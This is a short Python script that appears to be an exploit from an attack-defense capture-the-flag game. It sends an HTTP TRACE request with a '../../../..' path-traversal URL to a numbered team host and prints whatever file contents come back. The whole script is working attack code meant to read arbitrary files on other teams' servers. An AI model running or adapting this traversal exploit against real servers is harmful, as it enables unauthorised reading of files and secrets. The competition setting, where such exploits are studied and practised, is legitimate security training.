from requests import Request, Session

import sys

this, team_num, root_path = sys.argv

s = Session()
req = Request('TRACE',  'http://team{}.hf/../../../..{}'.format(team_num, root_path),
    data={},
    headers={},
)

prepped = s.prepare_request(req)
resp = s.send(prepped)

print(resp.text)
